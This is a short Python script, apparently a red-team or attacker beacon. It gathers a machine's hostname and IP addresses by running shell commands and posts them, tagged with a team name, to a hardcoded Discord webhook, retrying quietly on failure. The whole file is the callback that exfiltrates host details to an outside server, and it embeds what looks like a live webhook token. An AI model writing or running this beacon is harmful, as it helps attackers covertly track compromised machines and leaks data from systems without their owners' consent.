import os
import subprocess
import requests
import time

TEAM_NAME = "default"

webhook_url = "https://discord.com/api/webhooks/1345273501199896597/5BQjVDqQQQOQr-LWtPEpjnF2-XyxyRW6kfRhGRK5RG3TdfPEaIS3MZ6FcLausGVpvsaL"
hostname_cmd = "hostname"
ip_command = "hostname -I"


def clean_output(output):
    return output.decode("utf-8").strip()


hostname = clean_output(subprocess.check_output(hostname_cmd, shell=True))
ipaddrs = clean_output(subprocess.check_output(ip_command, shell=True))
DIVIDER = {"-" * 32}

data = {"content": f"{DIVIDER}\nid:\n\t{TEAM_NAME}|{hostname} \nip:\n\t{ipaddrs}\n{DIVIDER}"}


for _ in range(10):
    try:
        response = requests.post(webhook_url, json=data)
        break
    except:
        time.sleep(5)
        pass
